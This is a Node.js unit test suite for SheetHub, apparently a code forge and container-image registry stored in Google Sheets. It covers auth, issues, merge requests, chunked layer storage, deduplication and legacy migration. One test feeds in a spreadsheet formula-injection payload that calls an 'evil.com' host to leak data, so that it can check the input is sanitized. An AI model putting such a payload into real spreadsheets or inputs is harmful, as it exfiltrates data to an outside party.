#!/usr/bin/env node
// Unit test for SheetHub: mocks the Apps Script Sheet layer and runs
// the real Code.gs functions in Node.js.
// Asserts tab initialization, multi-repo seed data, doGet query contract,
// negative auth enforcement, repo filtering, mutation actions, and
// SICF v0.1 specification compliance (Images/Layers tabs, OCI image model,
// layer deduplication, sheetbuild round-trip, and Sheeternetes sicf: resolution).
//
// Usage: node hack/test.js

const fs = require('fs');
const path = require('path');

const codeText = fs.readFileSync(path.join(__dirname, '..', 'Code.gs'), 'utf8');

// ---- In-memory Google Sheet mock ----
function makeSheet(h) { return { grid: [h.slice()] }; }
function lastNonEmpty(g) {
  for (let r = g.length; r >= 1; r--) {
    if ((g[r - 1] || []).some(c => c !== '' && c != null)) return r;
  }
  return 1;
}

function rangeObj(s, row, col, nr, nc) {
  const o = {
    clearContent() {
      for (let i = 0; i < nr; i++) {
        const r = row - 1 + i;
        if (!s.grid[r]) s.grid[r] = [];
        for (let j = 0; j < nc; j++) s.grid[r][col - 1 + j] = '';
      }
      return o;
    },
    setValues(v) {
      for (let i = 0; i < v.length; i++) {
        const r = row - 1 + i;
        if (!s.grid[r]) s.grid[r] = [];
        for (let j = 0; j < v[i].length; j++) s.grid[r][col - 1 + j] = v[i][j];
      }
      return o;
    },
    setFontWeight() { return o; },
  };
  return o;
}

function api2(s, name) {
  return {
    getName: () => name || s.name || '',
    getDataRange: () => ({ getValues: () => s.grid.map(r => r.slice()) }),
    getRange: (r, c, nr, nc) => rangeObj(s, r, c, nr, nc),
    getLastRow: () => lastNonEmpty(s.grid),
    appendRow: (a) => { s.grid.push(a.slice()); },
    deleteRows: (st, n) => { s.grid.splice(st - 1, n); },
    setFrozenRows: () => {},
  };
}

const store = {
  Repos:          makeSheet(['name', 'description', 'default_branch', 'visibility', 'stars_count', 'created_at', 'updated_at']),
  Issues:         makeSheet(['id', 'repo', 'number', 'title', 'body', 'author', 'state', 'labels', 'created_at', 'updated_at']),
  MergeRequests:  makeSheet(['id', 'repo', 'number', 'title', 'description', 'author', 'source_branch', 'target_branch', 'state', 'diff_manifest', 'created_at', 'updated_at']),
  Releases:       makeSheet(['id', 'repo', 'tag_name', 'name', 'body', 'author', 'created_at', 'assets']),
  Users:          makeSheet(['username', 'name', 'avatar_url', 'role', 'bio', 'created_at']),
  Comments:       makeSheet(['id', 'target_type', 'target_id', 'author', 'body', 'created_at']),
  Stars:          makeSheet(['repo', 'username', 'starred_at']),
  Files:          makeSheet(['repo', 'path', 'branch', 'content', 'updated_at']),
  Images:         makeSheet(['name', 'digest', 'config', 'layers', 'created', 'size', 'repo', 'tag', 'author', 'pushed_at', 'id', 'updated_at']),
  Layers:         makeSheet(['digest', 'ordinal', 'media_type', 'data', 'size_bytes', 'id', 'created_at']),
};

const SpreadsheetApp = {
  getActiveSpreadsheet: () => ({
    getId: () => 'sheethub-test',
    getSheetByName: (n) => {
      const norm = (n === 'Registry' || n === 'images') ? 'Images' : ((n === 'RegistryChunks' || n === 'layers') ? 'Layers' : n);
      return store[norm] ? api2(store[norm], norm) : (store[n] ? api2(store[n], n) : null);
    },
    insertSheet: (n) => {
      const norm = (n === 'Registry' || n === 'images') ? 'Images' : ((n === 'RegistryChunks' || n === 'layers') ? 'Layers' : n);
      store[norm] = store[norm] || makeSheet([]);
      return api2(store[norm], norm);
    }
  })
};

let uuidN = 0;
const crypto = require('crypto');
const Utilities = {
  getUuid: () => (++uuidN).toString(36).split('').reverse().join('').padEnd(8, '0'),
  DigestAlgorithm: { SHA_256: 'SHA_256' },
  base64Decode: (str) => Array.from(Buffer.from(str, 'base64')),
  base64Encode: (bytes) => Buffer.from(bytes).toString('base64'),
  newBlob: (strOrBytes) => ({
    getBytes: () => Array.from(Buffer.isBuffer(strOrBytes) ? strOrBytes : Buffer.from(String(strOrBytes), 'utf8'))
  }),
  computeDigest: (algo, bytes) => {
    const buf = Buffer.from(bytes);
    const hashBuf = crypto.createHash('sha256').update(buf).digest();
    return Array.from(new Int8Array(hashBuf.buffer, hashBuf.byteOffset, hashBuf.length));
  }
};
let lockShouldFail = false;
const LockService = { getScriptLock: () => ({ tryLock() { return !lockShouldFail; }, releaseLock() {} }) };
const ContentService = {
  MimeType: { JSON: 'json' },
  createTextOutput: (t) => ({ _t: t, setMimeType() { return this; } })
};
const HtmlService = {
  XFrameOptionsMode: { ALLOWALL: 'ALLOWALL' },
  createHtmlOutputFromFile: () => ({ setTitle() { return this; }, setXFrameOptionsMode() { return this; } })
};

const api = new Function(
  'SpreadsheetApp', 'Utilities', 'LockService', 'ContentService', 'HtmlService',
  codeText + '\nreturn { setup, readTab, writeTab, doGet, doPost };'
)(SpreadsheetApp, Utilities, LockService, ContentService, HtmlService);

let pass = 0, fail = 0;
const check = (n, c, d) => {
  if (c) {
    pass++;
    console.log('  PASS', n);
  } else {
    fail++;
    console.log('  FAIL', n, '->', JSON.stringify(d));
  }
};

console.log('\n== A: Setup & Seed Multiple Repos ==');
api.setup();

const repos = api.readTab('Repos');
check('Repos tab populated', repos.length >= 2, repos.length);
check('both hello-web and sheeternetes-manifests exist',
  repos.some(r => r.name === 'sncf/hello-web') && repos.some(r => r.name === 'sncf/sheeternetes-manifests'),
  repos.map(r => r.name)
);

const issues = api.readTab('Issues');
check('Issues tab seeded across multiple repos',
  issues.some(i => i.repo === 'sncf/hello-web') && issues.some(i => i.repo === 'sncf/sheeternetes-manifests'),
  issues.map(i => `${i.repo}:#${i.number}`)
);

const mrs = api.readTab('MergeRequests');
check('MergeRequests tab seeded across multiple repos',
  mrs.some(m => m.repo === 'sncf/hello-web') && mrs.some(m => m.repo === 'sncf/sheeternetes-manifests'),
  mrs.map(m => `${m.repo}:!${m.number}`)
);

console.log('\n== B: Negative & Unconditional Auth Enforcement ==');
const unauthGetNoToken = JSON.parse(api.doGet({ parameter: { kind: 'repos' } })._t);
check('doGet without token rejected as unauthorized', unauthGetNoToken.error === 'unauthorized', unauthGetNoToken);

const unauthGetWrongToken = JSON.parse(api.doGet({ parameter: { token: 'wrong_secret', kind: 'repos' } })._t);
check('doGet with wrong token rejected as unauthorized', unauthGetWrongToken.error === 'unauthorized', unauthGetWrongToken);

const unauthPostNoToken = JSON.parse(api.doPost({ postData: { contents: JSON.stringify({ action: 'create_issue' }) } })._t);
check('doPost without token rejected as unauthorized', unauthPostNoToken.error === 'unauthorized', unauthPostNoToken);

const unauthPostWrongToken = JSON.parse(api.doPost({ postData: { contents: JSON.stringify({ token: 'wrong', action: 'create_issue' }) } })._t);
check('doPost with wrong token rejected as unauthorized', unauthPostWrongToken.error === 'unauthorized', unauthPostWrongToken);

console.log('\n== C: doGet SNCF Query Contract & Meaningful Repo Filtering ==');
const validToken = 'CHANGE_ME_super_secret';

const reqAllRepos = JSON.parse(api.doGet({ parameter: { token: validToken, kind: 'repos' } })._t);
check('doGet ?kind=repos with token returns items array', Array.isArray(reqAllRepos.items) && reqAllRepos.items.length >= 2, reqAllRepos);

const reqHelloIssues = JSON.parse(api.doGet({ parameter: { token: validToken, kind: 'issues', repo: 'sncf/hello-web' } })._t);
check('doGet ?kind=issues&repo=sncf/hello-web returns only hello-web issues',
  reqHelloIssues.items.length >= 2 && reqHelloIssues.items.every(i => i.repo === 'sncf/hello-web'),
  reqHelloIssues.items
);

const reqManifestsIssues = JSON.parse(api.doGet({ parameter: { token: validToken, kind: 'issues', repo: 'sncf/sheeternetes-manifests' } })._t);
check('doGet ?kind=issues&repo=sncf/sheeternetes-manifests returns only manifests issues',
  reqManifestsIssues.items.length >= 1 && reqManifestsIssues.items.every(i => i.repo === 'sncf/sheeternetes-manifests'),
  reqManifestsIssues.items
);

const reqCanonicalMrs = JSON.parse(api.doGet({ parameter: { token: validToken, kind: 'mergerequests', repo: 'sncf/hello-web' } })._t);
check('doGet with canonical kind=mergerequests works', reqCanonicalMrs.items.length >= 1, reqCanonicalMrs);

console.log('\n== D: doPost Issue Creation & Scoped MR Merge ==');
const newIssueRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'create_issue',
      repo: 'sncf/hello-web',
      title: 'Support health checks',
      body: 'Add /healthz probe to whoami spec',
      author: 'contributor1'
    })
  }
})._t);
check('create_issue returns ok with next number for specific repo', newIssueRes.ok && newIssueRes.issue.number === 3, newIssueRes);

const mergeRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'merge_mr',
      repo: 'sncf/hello-web',
      mr_id: 1
    })
  }
})._t);
check('merge_mr scoped by repo succeeds', mergeRes.ok && mergeRes.mr.state === 'merged' && mergeRes.mr.repo === 'sncf/hello-web', mergeRes);

const updatedFiles = api.readTab('Files');
const helloAppFile = updatedFiles.find(f => f.repo === 'sncf/hello-web' && f.path === 'app.json');
check('merged diff applied to Files tab for hello-web', helloAppFile && JSON.parse(helloAppFile.content).deployments[0].replicas === 5, helloAppFile);

console.log('\n== E: Server Busy / Non-Throwing Lock Handling ==');
lockShouldFail = true;
const lockTimeoutRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'create_issue',
      repo: 'sncf/hello-web',
      title: 'Test Lock'
    })
  }
})._t);
check('lock timeout returns clean JSON error', lockTimeoutRes.error === 'server busy', lockTimeoutRes);
lockShouldFail = false;

console.log('\n== F: SICF v0.1 Container Registry in Cells (Issue #5) ==');
const seededImages = api.readTab('Images');
check('Images tab seeded per SICF v0.1', seededImages.length >= 2, seededImages.length);
check('Images tab has SICF core columns (name, digest, config, layers, created, size)',
  seededImages.every(img => img.name && img.digest && img.config && img.layers && img.created && img.size !== undefined),
  seededImages[0]
);
check('Images tab preserves additive forge columns (repo, tag, author, pushed_at)',
  seededImages.every(img => img.repo && img.tag && img.author && img.pushed_at),
  seededImages[0]
);

const seededLayers = api.readTab('Layers');
check('Layers tab seeded with chunks', seededLayers.length >= 3, seededLayers.length);
check('Layers tab has SICF core columns (digest, ordinal, media_type, data)',
  seededLayers.every(l => l.digest && l.ordinal !== undefined && l.media_type && l.data !== undefined),
  seededLayers[0]
);
check('All seeded chunk characters are <= 32,767 (Excel cell limit)',
  seededLayers.every(c => String(c.data).length <= 32767),
  seededLayers.map(c => String(c.data).length)
);

// Query registry with repo filtering
const reqHelloRegistry = JSON.parse(api.doGet({ parameter: { token: validToken, kind: 'images', repo: 'sncf/hello-web' } })._t);
check('doGet ?kind=images&repo=sncf/hello-web filters by repo',
  reqHelloRegistry.items.length >= 1 && reqHelloRegistry.items.every(r => r.repo === 'sncf/hello-web'),
  reqHelloRegistry.items
);

// Push large image layer (>70,000 base64 chars) that requires automatic cell range sharding
const rawPayload = Buffer.from('SheetHub container layer test binary data payload '.repeat(2000), 'utf8');
const testLayerDigest = 'sha256:' + crypto.createHash('sha256').update(rawPayload).digest('hex');
const testBase64 = rawPayload.toString('base64');

check('Test payload exceeds single cell capacity (len > 32767)', testBase64.length > 32767, testBase64.length);

// Server-side SHA-256 verification: negative test for mismatched digest
const badDigestRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'push_image',
      repo: 'sncf/hello-web',
      name: 'tampered-layer',
      tag: 'v1.0.0',
      digest: 'sha256:0000000000000000000000000000000000000000000000000000000000000000',
      content: testBase64,
      author: 'prateeekbuilds'
    })
  }
})._t);
check('push_image rejects tampered / mismatched client digest', badDigestRes.error && badDigestRes.error.includes('digest mismatch'), badDigestRes);

// Push image with valid digest and verify server-side verification
const pushRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'push_image',
      repo: 'sncf/hello-web',
      name: 'web-service',
      tag: 'v1.2.3',
      digest: testLayerDigest,
      content: testBase64,
      author: 'prateeekbuilds'
    })
  }
})._t);

check('push_image succeeds with sharded chunk count >= 2', pushRes.ok && pushRes.chunk_count >= 2, pushRes);
check('push_image returns SICF layers array', Array.isArray(pushRes.layers) && pushRes.layers.includes(testLayerDigest), pushRes);
check('push_image image record has config and layers list', pushRes.image && pushRes.image.config && pushRes.image.layers.includes(testLayerDigest), pushRes.image);

const layersAfterPush = api.readTab('Layers');
const pushedLayerChunks = layersAfterPush.filter(c => c.digest === testLayerDigest);
check('All sharded chunks strictly respect <= 32,767 char Excel cell cap and have ordinals',
  pushedLayerChunks.length >= 2 && pushedLayerChunks.every(c => String(c.data).length <= 32767 && c.ordinal !== undefined),
  pushedLayerChunks.map(c => ({ ordinal: c.ordinal, len: String(c.data).length }))
);

console.log('\n== G: Multi-Layer OCI Image Push & Content-Addressed Layer Deduplication ==');
const layerA = Buffer.from('Base Layer A (e.g. Alpine base filesystem contents)'.repeat(100), 'utf8');
const layerADigest = 'sha256:' + crypto.createHash('sha256').update(layerA).digest('hex');
const layerAB64 = layerA.toString('base64');

const layerB = Buffer.from('App Layer B (Node.js application bundle)'.repeat(100), 'utf8');
const layerBDigest = 'sha256:' + crypto.createHash('sha256').update(layerB).digest('hex');
const layerBB64 = layerB.toString('base64');

const layerC = Buffer.from('App Layer C (Python application bundle)'.repeat(100), 'utf8');
const layerCDigest = 'sha256:' + crypto.createHash('sha256').update(layerC).digest('hex');
const layerCB64 = layerC.toString('base64');

// Push multi-layer image 1: app-node with [layerA, layerB]
const nodeAppPushRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'push_image',
      repo: 'sncf/hello-web',
      name: 'app-node',
      tag: 'v1.0',
      layers: [
        { digest: layerADigest, media_type: 'application/vnd.oci.image.layer.v1.tar', content: layerAB64 },
        { digest: layerBDigest, media_type: 'application/vnd.oci.image.layer.v1.tar', content: layerBB64 }
      ],
      author: 'prateeekbuilds'
    })
  }
})._t);
check('push multi-layer image 1 (app-node) succeeds', nodeAppPushRes.ok && nodeAppPushRes.layers.length === 2, nodeAppPushRes);

const layersAfterNodePush = api.readTab('Layers').length;

// Push multi-layer image 2: app-python with [layerA, layerC] (shares layerA with app-node!)
const pythonAppPushRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'push_image',
      repo: 'sncf/hello-web',
      name: 'app-python',
      tag: 'v1.0',
      layers: [
        { digest: layerADigest, media_type: 'application/vnd.oci.image.layer.v1.tar', content: layerAB64 },
        { digest: layerCDigest, media_type: 'application/vnd.oci.image.layer.v1.tar', content: layerCB64 }
      ],
      author: 'tym83'
    })
  }
})._t);
check('push multi-layer image 2 (app-python) succeeds', pythonAppPushRes.ok && pythonAppPushRes.layers.length === 2, pythonAppPushRes);

const layersAfterPythonPush = api.readTab('Layers');
const layerARows = layersAfterPythonPush.filter(c => c.digest === layerADigest);
check('Content-addressed deduplication: layerA is stored ONLY ONCE in Layers tab despite being in 2 images',
  layerARows.length === 1,
  { layerARowsCount: layerARows.length }
);

console.log('\n== H: Round-Trip with sheetbuild Reference Spec & Integrity Verification ==');
// Simulate `sheetbuild export` on SheetHub image:
// 1. Read image manifest from Images tab
// 2. Decode config and verify sha256(config) === digest (or config digest)
// 3. For each layer in image.layers, read chunks from Layers tab, order by ordinal, join data, decode base64, verify sha256(bytes) === layerDigest
const exportedImage = api.readTab('Images').find(i => i.name === 'app-node:v1.0' || i.name === 'app-node');
check('Found app-node image in Images tab', !!exportedImage, exportedImage);

const configBytes = Buffer.from(exportedImage.config, 'base64');
const computedConfigDigest = 'sha256:' + crypto.createHash('sha256').update(configBytes).digest('hex');
check('Config blob digest matches image.digest', computedConfigDigest === exportedImage.digest || computedConfigDigest === exportedImage.config_digest, {
  computed: computedConfigDigest,
  imageDigest: exportedImage.digest
});

const exportedLayerDigests = String(exportedImage.layers).split(',');
const allStoreLayers = api.readTab('Layers');
const reassembledBlobs = [];

for (const lDig of exportedLayerDigests) {
  const chunks = allStoreLayers
    .filter(c => c.digest === lDig)
    .sort((a, b) => Number(a.ordinal) - Number(b.ordinal));
  const b64Data = chunks.map(c => c.data).join('');
  const blob = Buffer.from(b64Data, 'base64');
  const blobHash = 'sha256:' + crypto.createHash('sha256').update(blob).digest('hex');
  check(`Reassembled layer ${lDig.substring(0, 15)}... digest matches exactly`, blobHash === lDig, { expected: lDig, actual: blobHash });
  reassembledBlobs.push({ digest: blobHash, data: blob });
}

// Simulate `sheetbuild import` re-importing the exported image back:
// It computes config digest and layer digests from the tar components
const reimportedConfigDigest = 'sha256:' + crypto.createHash('sha256').update(configBytes).digest('hex');
const reimportedLayerDigests = reassembledBlobs.map(b => 'sha256:' + crypto.createHash('sha256').update(b.data).digest('hex'));

check('sheetbuild round-trip: config digest is 100% identical', reimportedConfigDigest === computedConfigDigest, reimportedConfigDigest);
check('sheetbuild round-trip: all layer digests are 100% identical',
  JSON.stringify(reimportedLayerDigests) === JSON.stringify(exportedLayerDigests),
  { exported: exportedLayerDigests, reimported: reimportedLayerDigests }
);

console.log('\n== I: Sheeternetes Kubelet Resolution of sicf:<name> ==');
// 1. Resolve sicf:traefik/whoami:latest
const kubeletWhoamiRes = JSON.parse(api.doGet({
  parameter: {
    token: validToken,
    kind: 'registry_pull',
    name: 'sicf:traefik/whoami:latest'
  }
})._t);
check('Kubelet resolves sicf:traefik/whoami:latest', kubeletWhoamiRes.ok && kubeletWhoamiRes.image && kubeletWhoamiRes.layers.length >= 1, kubeletWhoamiRes);

// 2. Resolve sicf:sncf/hello-web/app-node:v1.0
const kubeletAppNodeRes = JSON.parse(api.doGet({
  parameter: {
    token: validToken,
    kind: 'registry_pull',
    name: 'sicf:sncf/hello-web/app-node:v1.0'
  }
})._t);
check('Kubelet resolves sicf:sncf/hello-web/app-node:v1.0 with 2 structured layers',
  kubeletAppNodeRes.ok && kubeletAppNodeRes.layers.length === 2 && kubeletAppNodeRes.image.name.includes('app-node'),
  kubeletAppNodeRes
);

console.log('\n== J: Shared Layer Delete Guard & Cleanup ==');
// Delete app-node image
const delNodeRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'delete_image',
      repo: 'sncf/hello-web',
      image: 'app-node:v1.0'
    })
  }
})._t);
check('delete_image app-node:v1.0 succeeds', delNodeRes.ok && delNodeRes.deleted, delNodeRes);

// Layer A was shared by app-python, so Layer A must STILL exist in Layers tab
const layersAfterFirstDel = api.readTab('Layers');
check('Shared Layer A is preserved in Layers tab because app-python still references it',
  layersAfterFirstDel.some(c => c.digest === layerADigest),
  layersAfterFirstDel.map(c => c.digest)
);
// Layer B was unique to app-node, so Layer B should be cleaned up
check('Unique Layer B is cleaned up from Layers tab',
  !layersAfterFirstDel.some(c => c.digest === layerBDigest),
  layersAfterFirstDel.map(c => c.digest)
);

// Delete app-python image (now the last user of Layer A)
api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'delete_image',
      repo: 'sncf/hello-web',
      image: 'app-python:v1.0'
    })
  }
});

const layersAfterSecondDel = api.readTab('Layers');
check('Shared Layer A is cleaned up now that all images referencing it are deleted',
  !layersAfterSecondDel.some(c => c.digest === layerADigest),
  layersAfterSecondDel.map(c => c.digest)
);

console.log('\n== K: Negative Tests & Injection Guard ==');
// Undecodable base64
const undecodableRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'push_image',
      repo: 'sncf/hello-web',
      name: 'broken-b64',
      tag: 'latest',
      chunks: ['!!!NotValidBase64@@@']
    })
  }
})._t);
check('push_image rejects invalid/undecodable base64', undecodableRes.error && !undecodableRes.ok, undecodableRes);

// Empty layer
const emptyPushRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'push_image',
      repo: 'sncf/hello-web',
      name: 'empty-layer',
      tag: 'latest',
      chunks: ['']
    })
  }
})._t);
check('push_image rejects empty / zero-byte layer', emptyPushRes.error && emptyPushRes.error.includes('empty'), emptyPushRes);

// Oversized cell (> 32767 chars)
const oversizedRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'push_image',
      repo: 'sncf/hello-web',
      name: 'oversized-test',
      tag: 'latest',
      chunks: ['A'.repeat(35000)]
    })
  }
})._t);
check('push_image rejects chunks exceeding 32,767 cell limit', oversizedRes.error && oversizedRes.error.includes('32767'), oversizedRes);

// Formula injection protection test
const formulaIssueRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'create_issue',
      repo: 'sncf/hello-web',
      title: '=IMPORTDATA("http://evil.com/leak")',
      author: '+12345evil',
      body: '@SUM(1,2)'
    })
  }
})._t);
check('Formula injection inputs accepted and safely sanitized', formulaIssueRes.ok && formulaIssueRes.issue, formulaIssueRes);
const rawStoreRows = store['Issues'].grid;
const injectedRow = rawStoreRows.find(r => r && r.some(cell => String(cell).includes('IMPORTDATA')));
check('Formula injection string has single-quote prefix in raw sheet cells', injectedRow && injectedRow.some(cell => cell === '\'=IMPORTDATA("http://evil.com/leak")'), injectedRow);
const issuesReadBack = api.readTab('Issues');
const unescapedIssue = issuesReadBack.find(i => i.title === '=IMPORTDATA("http://evil.com/leak")');
check('readTab seamlessly unescapes formula strings back to clean text', !!unescapedIssue, unescapedIssue);

console.log('\n== M: Multi-Layer Pull Reassembly with Multi-Chunk Layers (Review Item 1) ==');
// Create Layer X (2 chunks) and Layer Y (2 chunks)
const rawLayerX = Buffer.from('Multi-chunk layer X payload data content '.repeat(20), 'utf8');
const b64LayerX = rawLayerX.toString('base64');
const chunkX0 = b64LayerX.substring(0, Math.floor(b64LayerX.length / 2));
const chunkX1 = b64LayerX.substring(Math.floor(b64LayerX.length / 2));
const digestX = 'sha256:' + crypto.createHash('sha256').update(rawLayerX).digest('hex');

const rawLayerY = Buffer.from('Multi-chunk layer Y different payload data '.repeat(20), 'utf8');
const b64LayerY = rawLayerY.toString('base64');
const chunkY0 = b64LayerY.substring(0, Math.floor(b64LayerY.length / 2));
const chunkY1 = b64LayerY.substring(Math.floor(b64LayerY.length / 2));
const digestY = 'sha256:' + crypto.createHash('sha256').update(rawLayerY).digest('hex');

const multiChunkPushRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'push_image',
      repo: 'sncf/hello-web',
      name: 'multi-chunk-svc',
      tag: 'v1.0',
      layers: [
        { digest: digestX, media_type: 'application/vnd.oci.image.layer.v1.tar', chunks: [chunkX0, chunkX1] },
        { digest: digestY, media_type: 'application/vnd.oci.image.layer.v1.tar', chunks: [chunkY0, chunkY1] }
      ],
      author: 'prateeekbuilds'
    })
  }
})._t);
check('push multi-layer image with multiple chunks per layer succeeds', multiChunkPushRes.ok && multiChunkPushRes.layers.length === 2, multiChunkPushRes);

// Pull the multi-layer image
const multiChunkPullRes = JSON.parse(api.doGet({
  parameter: {
    token: validToken,
    kind: 'registry_pull',
    repo: 'sncf/hello-web',
    name: 'multi-chunk-svc',
    tag: 'v1.0'
  }
})._t);

check('registry_pull returns structured layers array', multiChunkPullRes.ok && Array.isArray(multiChunkPullRes.layers) && multiChunkPullRes.layers.length === 2, multiChunkPullRes.layers);

// Reassemble Layer X and Layer Y independently per layer
const pulledLayerXChunks = multiChunkPullRes.layers[0].chunks
  .sort((a, b) => Number(a.ordinal) - Number(b.ordinal))
  .map(c => c.data || c.chunk_data)
  .join('');
const pulledLayerXBuf = Buffer.from(pulledLayerXChunks, 'base64');
const pulledLayerXHash = 'sha256:' + crypto.createHash('sha256').update(pulledLayerXBuf).digest('hex');

const pulledLayerYChunks = multiChunkPullRes.layers[1].chunks
  .sort((a, b) => Number(a.ordinal) - Number(b.ordinal))
  .map(c => c.data || c.chunk_data)
  .join('');
const pulledLayerYBuf = Buffer.from(pulledLayerYChunks, 'base64');
const pulledLayerYHash = 'sha256:' + crypto.createHash('sha256').update(pulledLayerYBuf).digest('hex');

check('Layer X reassembled chunks match digestX exactly (not interleaved with Layer Y)', pulledLayerXHash === digestX, { expected: digestX, actual: pulledLayerXHash });
check('Layer Y reassembled chunks match digestY exactly (not interleaved with Layer X)', pulledLayerYHash === digestY, { expected: digestY, actual: pulledLayerYHash });

console.log('\n== N: Legacy Tab Fallback & Migration on Unaliased Sheets (Review Item 2) ==');
// Create a separate unaliased spreadsheet store that ONLY has legacy Registry and RegistryChunks tabs
const legacyStore = {
  Registry: makeSheet(['id', 'repo', 'name', 'tag', 'digest', 'size_bytes', 'chunk_count', 'chunk_map', 'author', 'created_at', 'updated_at']),
  RegistryChunks: makeSheet(['id', 'digest', 'chunk_index', 'chunk_data', 'size_bytes', 'created_at'])
};

// Seed legacy rows into Registry and RegistryChunks
legacyStore.Registry.grid.push(['img-legacy-1', 'sncf/legacy-repo', 'legacy-app', 'v1.0', testLayerDigest, 1024, 2, '[]', 'alice', '2026-08-01T00:00:00Z', '2026-08-01T00:00:00Z']);
legacyStore.RegistryChunks.grid.push(['chk-leg-1', testLayerDigest, 0, 'SGVsbG8g', 6, '2026-08-01T00:00:00Z']);
legacyStore.RegistryChunks.grid.push(['chk-leg-2', testLayerDigest, 1, 'V29ybGQh', 6, '2026-08-01T00:00:00Z']);

const legacySpreadsheetApp = {
  getActiveSpreadsheet: () => ({
    getId: () => 'legacy-sheethub',
    // Strictly unaliased getSheetByName: returns null if exact tab name not found
    getSheetByName: (n) => (legacyStore[n] ? api2(legacyStore[n], n) : null),
    insertSheet: (n) => {
      legacyStore[n] = legacyStore[n] || makeSheet([]);
      return api2(legacyStore[n], n);
    }
  })
};

const legacyApi = new Function(
  'SpreadsheetApp', 'Utilities', 'LockService', 'ContentService', 'HtmlService',
  codeText + '\nreturn { setup, readTab, writeTab, doGet, doPost };'
)(legacySpreadsheetApp, Utilities, LockService, ContentService, HtmlService);

// 1. readTab('Images') on legacy sheet falls back to Registry tab and maps columns
const legacyImagesRead = legacyApi.readTab('Images');
check('readTab(Images) on legacy unaliased sheet falls back to Registry tab', legacyImagesRead.length === 1, legacyImagesRead);
check('Legacy row mapped to SICF schema (name:tag, layers, size, created)',
  legacyImagesRead[0] && legacyImagesRead[0].name === 'legacy-app:v1.0' && legacyImagesRead[0].layers === testLayerDigest && legacyImagesRead[0].size === 1024,
  legacyImagesRead[0]
);

const legacyLayersRead = legacyApi.readTab('Layers');
check('readTab(Layers) on legacy unaliased sheet falls back to RegistryChunks tab', legacyLayersRead.length === 2, legacyLayersRead);
check('Legacy chunk mapped to SICF schema (ordinal, media_type, data)',
  legacyLayersRead[0] && legacyLayersRead[0].ordinal === 0 && legacyLayersRead[0].data === 'SGVsbG8g',
  legacyLayersRead[0]
);

// 2. setup() migrates legacy rows into newly created Images and Layers tabs
legacyApi.setup();
check('setup() created Images tab on legacy sheet', !!legacyStore['Images'] && legacyStore['Images'].grid.length >= 2, legacyStore['Images']?.grid);
check('setup() created Layers tab on legacy sheet', !!legacyStore['Layers'] && legacyStore['Layers'].grid.length >= 2, legacyStore['Layers']?.grid);

console.log('\n== N2: Legacy data with an EMPTY Images/Layers tab already present ==');
const emptyTabStore = {
  Registry: makeSheet(['id', 'repo', 'name', 'tag', 'digest', 'size_bytes', 'chunk_count', 'chunk_map', 'author', 'created_at', 'updated_at']),
  RegistryChunks: makeSheet(['id', 'digest', 'chunk_index', 'chunk_data', 'size_bytes', 'created_at']),
  Images: makeSheet(['name', 'digest', 'config', 'layers', 'created', 'size', 'repo', 'tag', 'author', 'pushed_at', 'id', 'updated_at']),
  Layers: makeSheet(['digest', 'ordinal', 'media_type', 'data', 'size_bytes', 'id', 'created_at'])
};
emptyTabStore.Registry.grid.push(['img-legacy-2', 'sncf/legacy-repo', 'early-app', 'v0.9', testLayerDigest, 12, 2, '[]', 'bob', '2026-08-01T00:00:00Z', '2026-08-01T00:00:00Z']);
emptyTabStore.RegistryChunks.grid.push(['chk-e-1', testLayerDigest, 0, 'SGVsbG8g', 6, '2026-08-01T00:00:00Z']);
const emptyTabApi = new Function(
  'SpreadsheetApp', 'Utilities', 'LockService', 'ContentService', 'HtmlService',
  codeText + '\nreturn { setup, readTab, writeTab, doGet, doPost };'
)({
  getActiveSpreadsheet: () => ({
    getId: () => 'empty-tab-sheethub',
    getSheetByName: (n) => (emptyTabStore[n] ? api2(emptyTabStore[n], n) : null),
    insertSheet: (n) => { emptyTabStore[n] = emptyTabStore[n] || makeSheet([]); return api2(emptyTabStore[n], n); }
  })
}, Utilities, LockService, ContentService, HtmlService);
check('readTab(Images) falls back to Registry while Images has no data rows',
  emptyTabApi.readTab('Images').some(i => i.name === 'early-app:v0.9'));
emptyTabApi.setup();
check('setup() migrates legacy rows into a pre-existing empty Images tab',
  emptyTabStore.Images.grid.some(r => r.includes('early-app:v0.9')), emptyTabStore.Images.grid);
check('setup() migrates legacy chunks into a pre-existing empty Layers tab',
  emptyTabStore.Layers.grid.some(r => r.includes('SGVsbG8g')), emptyTabStore.Layers.grid);

console.log('\n== O: Image Digest Semantics (Review Item 3) ==');
// Push a single-layer image without client config
const singleLayerPayload = Buffer.from('Single layer for digest semantics verification', 'utf8');
const singleLayerB64 = singleLayerPayload.toString('base64');
const singleLayerDigest = 'sha256:' + crypto.createHash('sha256').update(singleLayerPayload).digest('hex');

const semPushRes = JSON.parse(api.doPost({
  postData: {
    contents: JSON.stringify({
      token: validToken,
      action: 'push_image',
      repo: 'sncf/hello-web',
      name: 'semantics-test',
      tag: 'v1.0',
      content: singleLayerB64,
      author: 'prateeekbuilds'
    })
  }
})._t);

check('Single-layer push succeeds', semPushRes.ok, semPushRes);
// image.digest is always the config digest (per SICF v0.1)
check('image.digest is config digest (different from layer digest)',
  semPushRes.image && semPushRes.image.digest !== singleLayerDigest && semPushRes.image.digest.startsWith('sha256:'),
  { imageDigest: semPushRes.image?.digest, layerDigest: singleLayerDigest }
);
check('image.layers contains the layer digest',
  semPushRes.image && semPushRes.image.layers === singleLayerDigest,
  semPushRes.image?.layers
);

